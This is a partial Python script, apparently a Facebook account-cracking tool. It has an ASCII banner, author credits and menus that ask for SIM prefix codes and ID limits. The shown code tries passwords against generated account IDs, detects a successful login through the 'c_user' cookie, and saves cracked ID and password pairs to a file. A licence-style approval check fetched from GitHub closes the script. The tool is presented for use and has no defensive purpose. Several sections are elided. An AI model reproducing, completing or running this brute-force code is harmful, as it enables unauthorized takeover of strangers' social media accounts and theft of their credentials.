...
.d88888b   .d888888  dP     dP  dP dP           
88.    "' d8'    88  88     88  88 88           
`Y88888b. 88aaaaa88a 88aaaaa88a 88 88           
...
d8'   .8P 88     88  88     88  88 88           
 Y88888P  88     88  dP     dP  dP 88888888P    
                     ...
                     best update
\x1b[1;92m---------------------------------------------------
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97mmuhib sahil   
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mmuhib sahil               
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP             
...
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m muhib sahil
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open https://chat.whatsaeJG2qDrIGJM5')
	if riaz1 =='3':
		os.system('xdg-open https://chat.whatsG2qDrIGJM5');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 070,079,078,****Etc')
    print('\x1b[1;92m[HAQANI] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[muhib] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 2000,3000,5000,****Etc')
    print('\x1b[1;92m[muhib] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[muhib] Idz Lemit : '))
    print(46*'-')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 070,078,077,****Etc')
    print('\x1b[1;92m[muhib] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[muhib] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 5000,100000,****Etc')
    print('\x1b[1;92m[muhib] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[muhib] Idz Lemit : '))
    print(46*'-')
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 9370,9378,9377,****Etc')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[muhib] Example  : 0306,92***,92***,****Etc')
    print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[muhib] Your Code : ')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[muhib-OK] '+cid+' | '+ps+'\033[0;97m')
                open('muhib-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mmuhib\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Mafia9370/muhib/blob/main/approval.txt').text
    if id in httpCaht:
